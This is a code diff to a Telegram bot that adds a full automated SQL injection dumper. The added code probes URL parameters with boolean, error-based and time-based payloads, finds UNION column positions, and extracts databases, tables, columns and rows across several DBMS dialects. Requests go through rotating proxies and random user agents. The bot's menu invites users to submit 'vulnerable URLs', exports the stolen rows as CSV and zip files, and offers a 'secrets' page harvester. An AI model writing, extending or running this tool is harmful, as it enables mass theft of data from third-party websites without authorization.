@@ -32,8 +32,10 @@ import time
 import random
 import asyncio
 import hashlib
+import difflib
 import logging
 import zipfile
+import csv
 import base64
 import html as _html
 import string
@@ -65,7 +67,7 @@ BOT_TOKEN = "PUT_YOUR_BOT_TOKEN_HERE"
 ADMIN_IDS = [8999053405]
 ADMIN_USERNAME = "@Bloody_sweet_baby"
 BRAND = "PYTHON SNAKE"
-VERSION = "v2.9.4"
+VERSION = "v2.9.5"
 KEY_RE = re.compile(r"^SNK-[A-Z0-9]{4}-[A-Z0-9]{4}$")
 
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
@@ -5084,6 +5086,8 @@ async def _route_tool_cb(update, context, data: str):
             return await cb_dump_go(update, context)
         if rest == "old":
             return await cb_dump_old(update, context)
+        if rest == "harv":
+            return await cb_dump_harv(update, context)
         if rest in ("last", "vuln"):
             return await cb_dump_use(update, context, rest)
         return await cb_dump_file(update, context)
@@ -6696,7 +6700,7 @@ async def cb_inj_cat(update, context, cat: str):
 
 
 async def cb_inj_go(update, context):
-    """🚀 START SCAN — URLs maango (text ya file)."""
+    """🚀 START SCAN — ask for URLs (text or file)."""
     q = update.callback_query
     cat = context.user_data.get("inj_cat", "all")
     last = context.user_data.get("last_urls") or []
@@ -7781,6 +7785,663 @@ def dump_record_text(rec: dict) -> list:
     return L_
 
 
+
+# ═══════════════════════════════════════════════════════════════════════════════
+#  SQL DATA EXTRACTION  (sqlmap-style dump — databases → tables → columns → rows)
+#  Sirf wahi URLs jinme injectable parameter asli request se confirm hota hai.
+# ═══════════════════════════════════════════════════════════════════════════════
+SQLI_MARK = "K3ySt0n3"
+SQLI_SEP = "<br>"
+
+# (quote, comment) — common real-world injection shapes
+SQLI_STYLES = [("'", "-- -"), ("", "-- -"), ('"', "-- -"), ("'", "#"),
+               ("')", "-- -"), ('")', "-- -"), ("')", "#"), ("'", "")]
+
+
+def _sqli_url(raw: str, param: str, suffix: str) -> str:
+    """Param ki ASLI value ke aage suffix jodo (replace nahi — warna injection tootega)."""
+    try:
+        u = urlparse(raw)
+        pairs = parse_qsl(u.query, keep_blank_values=True)
+        done, newp = False, []
+        for k, v in pairs:
+            if k == param and not done:
+                newp.append((k, v + suffix))
+                done = True
+            else:
+                newp.append((k, v))
+        if not done:
+            newp.append((param, suffix))
+        return urlunparse(u._replace(query=urlencode(newp, quote_via=quote_plus),
+                                     fragment=""))
+    except Exception:
+        return raw
+
+
+def _sqli_norm(t) -> str:
+    t = re.sub(r"\s+", " ", _html.unescape(str(t or "")))
+    return t[:8000]
+
+
+def _sqli_diff(a, b) -> int:
+    """Do pages me kitne characters ka farq hai (0 = bilkul same)."""
+    a, b = _sqli_norm(a), _sqli_norm(b)
+    if a == b:
+        return 0
+    if not a or not b:
+        return max(len(a), len(b))
+    sm = difflib.SequenceMatcher(None, a, b, autojunk=False)
+    return sum(max(i2 - i1, j2 - j1) for tag, i1, i2, j1, j2 in sm.get_opcodes()
+               if tag != "equal")
+
+
+def _sqli_body(r) -> str:
+    return (r or {}).get("body") or ""
+
+
+def _sqli_flat(x) -> str:
+    return re.sub(r"\s+", " ", _html.unescape(str(x or ""))).strip()
+
+
+def _sqli_split(raw: str) -> list:
+    return [x.strip() for x in str(raw or "").split(SQLI_SEP) if x.strip()]
+
+
+async def _sqli_req(session, url: str, timeout: float, rot=None, budget=None) -> dict:
+    """Ek request — rot proxy pehle. budget ho to request count hoti hai."""
+    if budget is not None:
+        if budget.get("left", 0) <= 0:
+            return {"status": 0, "len": 0, "body": "", "err": "budget"}
+        budget["left"] = budget.get("left", 0) - 1
+        budget["used"] = budget.get("used", 0) + 1
+    kw = {"headers": {"User-Agent": random.choice(UA_LIST), "Accept": "*/*"},
+          "timeout": aiohttp.ClientTimeout(total=timeout), "ssl": False,
+          "allow_redirects": True, "max_redirects": 4}
+    if rot:
+        px = rot.next()
+        if px:
+            try:
+                pxc, _h, _i, _s = await proxy_connect_url(px)
+                kw["proxy"] = pxc
+            except Exception:
+                pass
+    try:
+        async with session.get(url, **kw) as r:
+            body = await r.text(errors="ignore")
+            return {"status": r.status, "len": len(body), "body": body[:300000],
+                    "ms": 0}
+    except Exception as exc:
+        return {"status": 0, "len": 0, "body": "", "err": str(exc)[:70]}
+
+
+def _sqli_dbms_of(responses) -> str:
+    for r in responses:
+        if r:
+            hits = dbms_fingerprint(_sqli_body(r))
+            if hits:
+                return hits[0][0]
+    return ""
+
+
+# ── dialect helpers ─────────────────────────────────────────────────────────
+def _sqli_lit(dbms: str, val: str) -> str:
+    if (dbms or "MySQL") == "MySQL":
+        return "0x" + str(val).encode("utf-8", "ignore").hex()
+    return "'" + str(val).replace("'", "''") + "'"
+
+
+def _sqli_ord(dbms: str) -> str:
+    d = dbms or "MySQL"
+    if d == "SQLite":
+        return "UNICODE"
+    return "ORD" if d == "MySQL" else "ASCII"
+
+
+def _sqli_sub(dbms: str) -> str:
+    return "SUBSTR" if (dbms or "MySQL") in ("MySQL", "SQLite", "PostgreSQL") else "SUBSTRING"
+
+
+def _sqli_concat(dbms: str, parts) -> str:
+    d = dbms or "MySQL"
+    if d in ("SQLite", "PostgreSQL", "Oracle"):
+        return "(" + " || ".join(parts) + ")"
+    return "CONCAT(" + ", ".join(parts) + ")"
+
+
+def _sqli_quote_tbl(dbms: str, name: str) -> str:
+    d = dbms or "MySQL"
+    if d == "MySQL":
+        return "`" + str(name).replace("`", "``") + "`"
+    if d == "MSSQL":
+        return "[" + str(name).replace("]", "]]") + "]"
+    return '"' + str(name).replace('"', '""') + '"'
+
+
+def _sqli_wrap(dbms: str, sql: str) -> str:
+    return _sqli_concat(dbms, ["'%s'" % SQLI_MARK, "(%s)" % sql, "'%s'" % SQLI_MARK])
+
+
+def sqli_sql(dbms: str, key: str, table: str = "", cols=None, offset: int = 0) -> str:
+    """Dialect ke hisaab se SQL. key: current_db|dbs|tables|columns|row|count."""
+    d = dbms or "MySQL"
+    cols = list(cols or [])
+    if key == "current_db":
+        return {"MySQL": "SELECT DATABASE()", "SQLite": "SELECT 'main'",
+                "PostgreSQL": "SELECT current_database()",
+                "MSSQL": "SELECT DB_NAME()",
+                "Oracle": "SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM DUAL"}.get(
+            d, "SELECT DATABASE()")
+    if key == "dbs":
+        return {"MySQL": "SELECT GROUP_CONCAT(schema_name SEPARATOR '<br>') "
+                         "FROM information_schema.schemata",
+                "PostgreSQL": "SELECT STRING_AGG(schema_name,'<br>') "
+                              "FROM information_schema.schemata",
+                "MSSQL": "SELECT STRING_AGG(name,'<br>') FROM sys.databases",
+                "SQLite": "SELECT 'main'",
+                "Oracle": "SELECT LISTAGG(username,'<br>') WITHIN GROUP (ORDER BY username) "
+                          "FROM all_users"}.get(
+            d, "SELECT GROUP_CONCAT(schema_name SEPARATOR '<br>') "
+               "FROM information_schema.schemata")
+    if key == "tables":
+        return {"MySQL": "SELECT GROUP_CONCAT(table_name SEPARATOR '<br>') "
+                         "FROM information_schema.tables WHERE table_schema=DATABASE()",
+                "PostgreSQL": "SELECT STRING_AGG(table_name,'<br>') "
+                              "FROM information_schema.tables "
+                              "WHERE table_schema=current_schema()",
+                "MSSQL": "SELECT STRING_AGG(name,'<br>') FROM sysobjects WHERE xtype='U'",
+                "SQLite": "SELECT GROUP_CONCAT(name,'<br>') FROM sqlite_master "
+                          "WHERE type='table'",
+                "Oracle": "SELECT LISTAGG(table_name,'<br>') WITHIN GROUP "
+                          "(ORDER BY table_name) FROM user_tables"}.get(
+            d, "SELECT GROUP_CONCAT(table_name SEPARATOR '<br>') "
+               "FROM information_schema.tables WHERE table_schema=DATABASE()")
+    if key == "columns":
+        lit = _sqli_lit(d, table)
+        esc = str(table).replace("'", "''")
+        return {"MySQL": "SELECT GROUP_CONCAT(column_name SEPARATOR '<br>') "
+                         "FROM information_schema.columns WHERE table_name=%s" % lit,
+                "PostgreSQL": "SELECT STRING_AGG(column_name,'<br>') "
+                              "FROM information_schema.columns WHERE table_name=%s" % lit,
+                "MSSQL": "SELECT STRING_AGG(name,'<br>') FROM syscolumns "
+                         "WHERE id=OBJECT_ID('%s')" % esc,
+                "SQLite": "SELECT GROUP_CONCAT(name,'<br>') FROM pragma_table_info('%s')" % esc,
+                "Oracle": "SELECT LISTAGG(column_name,'<br>') WITHIN GROUP (ORDER BY column_id) "
+                          "FROM user_tab_columns WHERE table_name='%s'" % esc.upper()}.get(
+            d, "SELECT GROUP_CONCAT(column_name SEPARATOR '<br>') "
+               "FROM information_schema.columns WHERE table_name=%s" % lit)
+    if key == "count":
+        return "SELECT COUNT(*) FROM " + _sqli_quote_tbl(d, table)
+    if key == "row":
+        if not cols:
+            return ""
+        parts = []
+        for c in cols:
+            q = _sqli_quote_tbl(d, c)
+            if d == "MySQL":
+                parts.append("IFNULL(%s,'')" % q)
+            elif d == "MSSQL":
+                parts.append("ISNULL(CAST(%s AS NVARCHAR(MAX)),'')" % q)
+            elif d == "PostgreSQL":
+                parts.append("COALESCE(%s::text,'')" % q)
+            else:
+                parts.append("IFNULL(CAST(%s AS TEXT),'')" % q)
+        expr = (" + '||' + ".join(parts)) if d == "MSSQL" else (" || '||' || ".join(parts))
+        return "SELECT %s FROM %s LIMIT %d,1" % (
+            expr, _sqli_quote_tbl(d, table), int(offset))
+    return ""
+
+
+# ── detection ───────────────────────────────────────────────────────────────
+async def sqli_detect(session, raw: str, param: str, timeout: float = 8.0,
+                      rot=None, budget=None) -> dict:
+    """URL ke ek param me asli injection hai? TRUE vs FALSE page ka farq dekho."""
+    out = {"raw": raw, "param": param, "ok": False, "why": "", "dbms": "",
+           "tech": "", "quote": "", "comment": "", "true": None, "false": None,
+           "base": None, "noise": 0}
+    base = await _sqli_req(session, raw, timeout, rot, budget)
+    if not base.get("status"):
+        out["why"] = "no response (%s)" % (base.get("err") or "timeout")
+        return out
+    if base.get("status") in (401, 403, 429):
+        out["why"] = "blocked (HTTP %s)" % base["status"]
+        return out
+    out["base"] = base
+    err_hits = []          # (quote, comment, dbms)
+    dbms_seen = _sqli_dbms_of([base])
+    for q, c in SQLI_STYLES:
+        # 1) DB error — sirf quote bhejo
+        e = await _sqli_req(session, _sqli_url(raw, param, q + " " + c),
+                            timeout, rot, budget)
+        db = _sqli_dbms_of([e])
+        dbms_seen = dbms_seen or db
+        if db and not _sqli_dbms_of([base]) and e.get("status"):
+            err_hits.append((q, c, db))
+        # 2) boolean — TRUE page base jaisa, FALSE page alag
+        t = await _sqli_req(session, _sqli_url(raw, param, q + " AND 1=1 " + c),
+                            timeout, rot, budget)
+        f = await _sqli_req(session, _sqli_url(raw, param, q + " AND 1=2 " + c),
+                            timeout, rot, budget)
+        if not t.get("status") or not f.get("status"):
+            continue
+        dbms_seen = dbms_seen or _sqli_dbms_of([t, f])
+        d_tb = _sqli_diff(_sqli_body(t), _sqli_body(base))
+        d_tf = _sqli_diff(_sqli_body(t), _sqli_body(f))
+        noise = d_tb
+        if d_tf >= 1 and d_tf > noise and noise <= max(30, int(0.03 * len(_sqli_norm(_sqli_body(base))))):
+            out.update(ok=True, tech="boolean", quote=q, comment=c, true=t, false=f,
+                       noise=noise, dbms=dbms_seen or "")
+            break
+    if not out["ok"]:
+        if err_hits:
+            q, c, db = err_hits[0]
+            out.update(ok=True, tech="error", quote=q, comment=c, dbms=db)
+        else:
+            # 3) time-based (last resort, extraction nahi hogi)
+            for q, c in (("'", "-- -"), ("", "-- -")):
+                t1 = time.time()
+                r1 = await _sqli_req(session, _sqli_url(raw, param, (q + " AND SLEEP(0) " + c).strip()),
+                                     timeout, rot, budget)
+                t2 = time.time()
+                r2 = await _sqli_req(session, _sqli_url(raw, param, (q + " AND SLEEP(2) " + c).strip()),
+                                     timeout, rot, budget)
+                t3 = time.time()
+                if r1.get("status") and r2.get("status") and (t3 - t2) - (t2 - t1) > 1.2:
+                    out.update(ok=True, tech="time", quote=q, comment=c, dbms="MySQL")
+                    out["why"] = "time-based blind — data extraction skipped (too slow)"
+                    return out
+            out["why"] = "no boolean / error / time difference"
+            return out
+    if not out["dbms"]:
+        out["dbms"] = "MySQL"
+        out["dbms_guess"] = True
+    return out
+
+
+async def _sqli_cols(session, det: dict, timeout: float, rot=None, budget=None) -> int:
+    """ORDER BY se column count."""
+    q, c = det["quote"], det["comment"]
+    true_body = _sqli_body(det.get("true")) or _sqli_body(det.get("base"))
+    cols = 0
+    for n in range(1, 13):
+        r = await _sqli_req(session, _sqli_url(det["raw"], det["param"],
+                                               "%s ORDER BY %d %s" % (q, n, c)),
+                            timeout, rot, budget)
+        if not r.get("status") or _sqli_diff(_sqli_body(r), true_body) > max(30, det.get("noise", 0) + 10):
+            cols = n - 1
+            break
+    return max(0, cols)
+
+
+async def _sqli_union_pos(session, det: dict, cols: int, timeout: float,
+                          rot=None, budget=None) -> int:
+    """Kis column ki value page pe print hoti hai (0 = koi nahi)."""
+    if not cols:
+        return 0
+    q, c = det["quote"], det["comment"]
+    for i in range(cols):
+        expr = ["1"] * cols
+        expr[i] = _sqli_wrap(det.get("dbms") or "MySQL", "SELECT '%s'" % SQLI_MARK)
+        payload = "%s UNION SELECT %s %s" % (q, ", ".join(expr), c)
+        r = await _sqli_req(session, _sqli_url(det["raw"], det["param"], payload),
+                            timeout, rot, budget)
+        if r.get("status") and (SQLI_MARK * 2) in _html.unescape(_sqli_body(r)):
+            return i + 1
+    return 0
+
+
+async def _sqli_union_text(session, det: dict, cols: int, pos: int, sql: str,
+                           timeout: float, rot=None, budget=None) -> str:
+    if not sql or not cols or not pos:
+        return ""
+    expr = ["1"] * cols
+    expr[pos - 1] = _sqli_wrap(det.get("dbms") or "MySQL", sql)
+    payload = "%s UNION SELECT %s %s" % (det["quote"], ", ".join(expr),
+                                         det["comment"])
+    r = await _sqli_req(session, _sqli_url(det["raw"], det["param"], payload),
+                        timeout, rot, budget)
+    body = _html.unescape(_sqli_body(r))
+    m = re.search(re.escape(SQLI_MARK) + r"(.*?)" + re.escape(SQLI_MARK), body, re.S)
+    if not m:
+        return ""
+    return _sqli_flat(m.group(1))[:6000]
+
+
+def _sqli_error_payload(det: dict, sql: str) -> str:
+    q, c = det["quote"], det["comment"]
+    inner = ("(SELECT 1 FROM(SELECT COUNT(*),CONCAT((%s),FLOOR(RAND(0)*2))x "
+             "FROM information_schema.tables GROUP BY x)a)" % sql)
+    return q + " AND " + inner + " " + c
+
+
+async def _sqli_error_text(session, det: dict, sql: str, timeout: float,
+                           rot=None, budget=None) -> str:
+    if not sql:
+        return ""
+    r = await _sqli_req(session, _sqli_url(det["raw"], det["param"],
+                                           _sqli_error_payload(det, sql)),
+                        timeout, rot, budget)
+    body = _html.unescape(_sqli_body(r))
+    m = re.search(r"Duplicate entry '(.+?)' for key", body, re.I | re.S)
+    if not m:
+        return ""
+    val = re.sub(r"\d{1,2}$", "", m.group(1))       # RAND() ka last digit hatao
+    return _sqli_flat(val)[:6000]
+
+
+def _sqli_row_sql(det: dict, table: str, cols: list, offset: int) -> str:
+    return sqli_sql(det.get("dbms") or "MySQL", "row", table=table, cols=cols,
+                    offset=offset)
+
+
+async def _sqli_blind_text(session, det: dict, sql: str, maxlen: int, timeout: float,
+                           rot=None, budget=None) -> str:
+    """Binary search — ek request me ek character ka poora range."""
+    out = ""
+    dbms = det.get("dbms") or "MySQL"
+    ordn, subn = _sqli_ord(dbms), _sqli_sub(dbms)
+    true_body, false_body = _sqli_body(det.get("true")), _sqli_body(det.get("false"))
+
+    async def cond(expr: str) -> bool:
+        payload = "%s AND (%s) %s" % (det["quote"], expr, det["comment"])
+        r = await _sqli_req(session, _sqli_url(det["raw"], det["param"], payload),
+                            timeout, rot, budget)
+        if not r.get("status") or r.get("status") >= 500:
+            return False
+        if dbms_fingerprint(_sqli_body(r)):
+            return False
+        d_t = _sqli_diff(_sqli_body(r), true_body) if true_body else 10 ** 6
+        d_f = _sqli_diff(_sqli_body(r), false_body) if false_body else 0
+        return d_t <= d_f
+
+    for p in range(1, maxlen + 1):
+        if budget is not None and budget.get("left", 0) <= 0:
+            out += "…"
+            break
+        if not await cond("%s(%s((%s),%d,1))>0" % (ordn, subn, sql, p)):
+            break
+        lo, hi = 31, 127
+        while lo < hi:
+            if budget is not None and budget.get("left", 0) <= 0:
+                return out + "…"
+            mid = (lo + hi) // 2
+            if await cond("%s(%s((%s),%d,1))>%d" % (ordn, subn, sql, p, mid)):
+                lo = mid + 1
+            else:
+                hi = mid
+        out += chr(lo)
+    return out
+
+
+async def _sqli_text(session, det: dict, sql: str, cols: int, pos: int, caps: dict,
+                     timeout: float, rot=None, budget=None, blind_len: int = 0) -> str:
+    """Value nikalo — union, phir error-based, phir blind."""
+    if not sql:
+        return ""
+    if pos and cols:
+        v = await _sqli_union_text(session, det, cols, pos, sql, timeout, rot, budget)
+        if v:
+            return v
+    if (det.get("dbms") or "") in ("MySQL", ""):
+        v = await _sqli_error_text(session, det, sql, timeout, rot, budget)
+        if v:
+            return v
+    if caps.get("blind", 1):
+        ln = blind_len or int(caps.get("blind_len", 22))
+        return await _sqli_blind_text(session, det, sql, ln, timeout, rot, budget)
+    return ""
+
+
+async def sqli_dump_one(session, raw: str, param: str = "", caps=None,
+                        timeout: float = 8.0, rot=None, on_stage=None) -> dict:
+    """Ek URL ka dump: param dhoondo → db → tables → columns → rows."""
+    caps = caps or {}
+    t0 = time.time()
+    res = {"url": raw, "param": param, "ok": False, "status": "", "dbms": "", "tech": "",
+           "quote": "", "comment": "", "db": "", "dbs": [], "tables": {},
+           "notes": [], "rows": 0, "requests": 0, "took": 0, "why": ""}
+    budget = {"left": int(caps.get("requests", 500)), "used": 0}
+    max_tables = int(caps.get("tables", 8))
+    max_rows = int(caps.get("rows", 8))
+
+    params = [param] if param else []
+    if not params:
+        try:
+            params = (url_reverse(raw).get("params") or [])[:4]
+        except Exception:
+            params = []
+    if not params:
+        res.update(status="no parameter in URL",
+                   why="URL has no query parameter")
+        return res
+
+    det = {}
+    for pn in params:
+        if budget["left"] <= 12:
+            break
+        if on_stage:
+            await on_stage("detect", "%s (%s)" % (urlparse(raw).path[-26:] or "/", pn))
+        det = await sqli_detect(session, raw, pn, timeout, rot, budget)
+        if det.get("ok"):
+            res["param"] = pn
+            break
+    if not det.get("ok"):
+        res.update(status="not injectable", why=det.get("why") or "no injection point",
+                   requests=budget["used"], took=time.time() - t0)
+        return res
+
+    dbms = det.get("dbms") or "MySQL"
+    if det.get("dbms_guess") or not dbms:
+        for cand, probe in (("SQLite", "SELECT sqlite_version()"),
+                            ("MySQL", "SELECT version()"),
+                            ("PostgreSQL", "SELECT version()")):
+            det["dbms"] = cand
+            got = await _sqli_text(session, det, probe, 0, 0, caps, timeout, rot, budget, 12)
+            if got and any(ch.isdigit() for ch in got):
+                dbms = cand
+                break
+        det["dbms"] = dbms
+    res.update(ok=True, status="injectable", dbms=dbms, tech=det.get("tech") or "",
+               quote=det.get("quote") or "", comment=det.get("comment") or "")
+    if det.get("tech") == "time":
+        res.update(status="time-based blind", tech="time-based",
+                   notes=["time-based injection confirmed — data extraction skipped "
+                          "(too slow on a phone)"], requests=budget["used"],
+                   took=time.time() - t0)
+        return res
+
+    if on_stage:
+        await on_stage("columns", "counting columns")
+    cols = await _sqli_cols(session, det, timeout, rot, budget)
+    pos = await _sqli_union_pos(session, det, cols, timeout, rot, budget) if cols else 0
+    if pos:
+        res["tech"] = "%s + UNION (column %d printed)" % (det.get("tech"), pos)
+    else:
+        res["tech"] = "%s (blind extraction)" % det.get("tech")
+        res["notes"].append("page does not print query output — extracted with "
+                            "boolean-blind requests")
+
+    async def value(sql: str, blen: int = 0):
+        return await _sqli_text(session, det, sql, cols, pos, caps, timeout, rot,
+                                budget, blen)
+
+    if on_stage:
+        await on_stage("database", "current database")
+    res["db"] = (await value(sqli_sql(dbms, "current_db"), 40)).strip()[:60]
+    if on_stage:
+        await on_stage("databases", "listing databases")
+    if pos:
+        res["dbs"] = _sqli_split(await value(sqli_sql(dbms, "dbs"), 300))[:40]
+    elif res["db"]:
+        res["dbs"] = [res["db"]]
+
+    if on_stage:
+        await on_stage("tables", "listing tables")
+    tbls = _sqli_split(await value(sqli_sql(dbms, "tables"),
+                                    800 if pos else int(caps.get("blind_tables_len", 60))))
+    tbls = [t for t in tbls if t and not t.startswith("sqlite_")][:max_tables]
+    if not tbls:
+        res["notes"].append("table list empty (no rights / WAF / no output)")
+
+    for tbl in tbls:
+        if budget["left"] <= 4:
+            res["notes"].append("request budget finished — remaining tables skipped")
+            break
+        if on_stage:
+            await on_stage("columns", tbl)
+        colnames = _sqli_split(await value(sqli_sql(dbms, "columns", table=tbl),
+                                           600 if pos else int(caps.get("blind_cols_len", 80))))[:40]
+        entry = {"cols": colnames, "rows": [], "truncated": False}
+        res["tables"][tbl] = entry
+        if not colnames:
+            res["notes"].append("%s: columns not readable" % tbl)
+            continue
+        limit = max_rows if pos else int(caps.get("blind_rows", 0) or 0)
+        for k in range(limit):
+            if budget["left"] <= 4:
+                entry["truncated"] = True
+                break
+            if on_stage:
+                await on_stage("rows", "%s (%d)" % (tbl, k + 1))
+            row = await value(_sqli_row_sql(det, tbl, colnames, k), 260)
+            if not row or SQLI_MARK in row:
+                break
+            vals = [x.strip() for x in row.split("||")]
+            if not any(vals):
+                break
+            entry["rows"].append(vals)
+            res["rows"] += 1
+        if pos and len(entry["rows"]) >= max_rows:
+            entry["truncated"] = True
+    res["requests"] = budget["used"]
+    res["took"] = time.time() - t0
+    return res
+
+
+def sqli_report_text(res: dict) -> list:
+    """Plain-text report — copy-paste safe."""
+    L_ = ["=" * 64,
+          "URL    : " + str(res.get("url") or ""),
+          "PARAM  : %s    STATUS: %s" % (res.get("param") or "-", res.get("status") or ""),
+          "DBMS   : %s    TECHNIQUE: %s" % (res.get("dbms") or "-", res.get("tech") or "-"),
+          "DB     : " + (res.get("db") or "-"),
+          "QUES   : quote=%r comment=%r" % (res.get("quote") or "", res.get("comment") or ""),
+          "REQ    : %s    TIME: %.1fs" % (res.get("requests", 0), res.get("took", 0))]
+    if res.get("why"):
+        L_.append("NOTE   : " + str(res["why"]))
+    if res.get("dbs"):
+        L_.append("-" * 64)
+        L_.append("DATABASES (%d): %s" % (len(res["dbs"]), ", ".join(res["dbs"][:40])))
+    for tname, entry in (res.get("tables") or {}).items():
+        L_.append("-" * 64)
+        L_.append("TABLE %s   COLUMNS (%d): %s" % (
+            tname, len(entry.get("cols") or []),
+            ", ".join(entry.get("cols") or []) or "-"))
+        for row in entry.get("rows") or []:
+            L_.append("  " + " | ".join(str(x)[:80] for x in row))
+        if entry.get("truncated"):
+            L_.append("  ... limit reached (use /batch dumprows to raise)")
+        if not entry.get("rows"):
+            L_.append("  (no rows extracted)")
+    if res.get("notes"):
+        L_.append("-" * 64)
+        for n in res["notes"]:
+            L_.append("* " + str(n))
+    L_.append("=" * 64)
+    return L_
+
+
+async def sqli_dump(urls: list, targets=None, caps=None, timeout: float = 8.0,
+                    conc: int = 3, progress=None, uid=None) -> dict:
+    """Saare URLs ka dump — live progress ke saath."""
+    urls = _uniq([u for u in (urls or []) if str(u).startswith("http")])
+    caps = caps or {}
+    st = {"urls": len(urls), "done": 0, "results": [], "rows": 0, "tables": 0,
+          "injectable": 0, "start": time.time(), "stage": "start", "stage_info": "",
+          "stopped": 0}
+    rot = ProxyRotator(enabled=proxy_available())
+    sem = asyncio.Semaphore(max(1, min(8, conc)))
+    lock = asyncio.Lock()
+    conn = mk_connector(limit=max(4, conc + 2), force_close=True)
+
+    async def one(session, raw, param):
+        if uid and stop_requested(uid):
+            return
+        report = {"last": 0.0}
+
+        async def stage(name, info):
+            st["stage"], st["stage_info"] = name, str(info)[:44]
+            if progress and time.time() - report["last"] > 2.0:
+                report["last"] = time.time()
+                try:
+                    await progress(st)
+                except Exception:
+                    pass
+
+        async with sem:
+            if uid and stop_requested(uid):
+                return
+            try:
+                res = await sqli_dump_one(session, raw, param or "", caps, timeout, rot,
+                                          stage)
+            except Exception as exc:
+                res = {"url": raw, "status": "error", "why": str(exc)[:90], "tables": {},
+                       "dbs": [], "rows": 0, "took": 0, "requests": 0, "ok": False,
+                       "notes": []}
+            async with lock:
+                st["done"] += 1
+                st["results"].append(res)
+                st["rows"] += res.get("rows", 0)
+                st["tables"] += len(res.get("tables") or {})
+                if res.get("ok"):
+                    st["injectable"] += 1
+                if progress:
+                    try:
+                        await progress(st)
+                    except Exception:
+                        pass
+
+    async with aiohttp.ClientSession(connector=conn) as session:
+        await asyncio.gather(*[one(session, u, (targets or {}).get(u, "")) for u in urls])
+    if uid and stop_requested(uid):
+        st["stopped"] = 1
+    st["took"] = time.time() - st["start"]
+    return st
+
+
+def sqli_save(st: dict) -> dict:
+    """Har URL ka report + all_rows.csv + poora zip."""
+    stamp_ = stamp()
+    files, rows_csv = [], []
+    zpath = os.path.join(DUMP_DIR, "sqldump_%s.zip" % stamp_)
+    csv_path = os.path.join(DUMP_DIR, "sqldump_rows_%s.csv" % stamp_)
+    try:
+        for i, res in enumerate(st.get("results") or [], 1):
+            host = re.sub(r"[^A-Za-z0-9.\-]", "_",
+                          urlparse(res.get("url") or "").netloc or "site")
+            fp = os.path.join(DUMP_DIR, "sqldump_%s_%02d_%s.txt" % (stamp_, i, host[:36]))
+            with open(fp, "w", encoding="utf-8") as f:
+                f.write("\n".join(sqli_report_text(res)) + "\n")
+            files.append(fp)
+            for tname, entry in (res.get("tables") or {}).items():
+                for row in entry.get("rows") or []:
+                    rows_csv.append([res.get("url", ""), res.get("db", ""), tname,
+                                     "|".join(str(x) for x in row)])
+        with open(csv_path, "w", encoding="utf-8", newline="") as f:
+            w = csv.writer(f)
+            w.writerow(["url", "database", "table", "row"])
+            for r in rows_csv:
+                w.writerow(r)
+        with zipfile.ZipFile(zpath, "w", zipfile.ZIP_DEFLATED) as zf:
+            for fp in files:
+                zf.write(fp, arcname=os.path.basename(fp))
+            if rows_csv:
+                zf.write(csv_path, arcname="all_rows.csv")
+    except Exception as exc:
+        logger.warning("sqli_save fail: %s", exc)
+    return {"files": files, "zip": zpath if os.path.exists(zpath) else "",
+            "csv": csv_path if os.path.exists(csv_path) else "", "rows": len(rows_csv)}
+
+
 async def dump_harvest(urls: list, progress=None, uid=None, timeout: float = 10.0,
                        conc: int = 12) -> dict:
     """Har URL fetch karo aur data nikaalo — asli network, rot proxy priority."""
@@ -7874,39 +8535,40 @@ async def dump_harvest(urls: list, progress=None, uid=None, timeout: float = 10.
 
 
 async def tool_dump(update, context):
-    """DUMPER — URLs do, poora page data harvest karke files/zip milti hain."""
+    """DUMPER — URLs do, andar ka SQL data nikaalo (full dump)."""
     q = update.callback_query
-    files = dumps_list(5)
+    files = dumps_list(4)
     last = len(context.user_data.get("last_urls") or [])
     vuln_last = len(context.user_data.get("last_vulns") or [])
-    rows = [[InlineKeyboardButton("📥 SEND URLS / FILE — start dump",
-                                  callback_data="df:go")]]
+    caps = _sqli_caps()
+    rows = [[InlineKeyboardButton("📥 SEND URLS — FULL SQL DUMP", callback_data="df:go")]]
     if vuln_last:
-        rows.append([InlineKeyboardButton("💉 USE LAST %d VULNERABLE URLS" % vuln_last,
+        rows.append([InlineKeyboardButton("💉 LAST VULNERABLE URLS (%d)" % vuln_last,
                                           callback_data="df:vuln")])
     if last:
-        rows.append([InlineKeyboardButton("📥 USE LAST %d PARSER URLS" % last,
+        rows.append([InlineKeyboardButton("📥 LAST PARSER URLS (%d)" % last,
                                           callback_data="df:last")])
+    rows.append([InlineKeyboardButton("🕸 PAGE HARVEST (forms/links/secrets)",
+                                      callback_data="df:harv")])
     if files:
-        rows.append([InlineKeyboardButton("📄 Old dump files (%d)" % len(files),
+        rows.append([InlineKeyboardButton("📄 Old files (%d)" % len(files),
                                           callback_data="df:old")])
         rows.append([InlineKeyboardButton("📦 ALL ZIP", callback_data="df:zip")])
     rows.append([InlineKeyboardButton("📤 FULL EXPORT (kw/dork/urls)",
                                       callback_data="df:full")])
     rows.append([InlineKeyboardButton("⬅️ BACK", callback_data="m:home")])
-    txt = (H("DUMPER", "page data harvester") + "\n\n"
-           + B("What you get") + "\n"
-           + KV("Forms", "action · method · id", "🧾") + "\n"
-           + KV("Parameters", "har link/input ka param", "🔧") + "\n"
-           + KV("Endpoints", "page ke saare andar ke links", "🔗") + "\n"
-           + KV("JS files", "script src list", "📜") + "\n"
-           + KV("Emails", "page pe mile emails", "✉️") + "\n"
-           + KV("Comments", "HTML comments (leaks)", "💬") + "\n"
-           + KV("Tables", "query me dikhe table/column names", "🗃") + "\n"
-           + KV("Secrets", "API keys / DB URLs / JWT", "🔑") + "\n\n"
-           + P("Send URLs one per line, or a .txt / .csv file — one report per URL, "
-               "and the whole pack as a single zip.") + "\n\n"
-           + "<code>https://target.com/page.php?id=5</code>")
+    txt = (H("DUMPER", "full SQL data dump") + "\n\n"
+           + B("Send vulnerable URLs") + "\n"
+           + P("paste URLs in the chat or send a .txt file — every URL is verified "
+               "first, then its data is extracted.") + "\n\n"
+           + KV("Method", "detect → columns → databases → tables → columns → rows", "🧩") + "\n"
+           + KV("Tables / URL", "<code>%s</code>" % fmt(caps["tables"]), "🗃") + "\n"
+           + KV("Rows / table", "<code>%s</code>" % fmt(caps["rows"]), "📄") + "\n"
+           + KV("Blind mode", "on (if page prints nothing)", "🙈") + "\n"
+           + KV("Request cap", "<code>%s</code> per URL" % fmt(caps["requests"]), "🔋") + "\n\n"
+           + B("You get") + "\n"
+           + P("one report per URL (DB, tables, columns, rows) + all_rows.csv + zip.")
+           + "\n\n<code>https://target.com/product.php?id=5</code>")
     try:
         await q.edit_message_text(txt, reply_markup=RK(rows), parse_mode=ParseMode.HTML)
     except Exception:
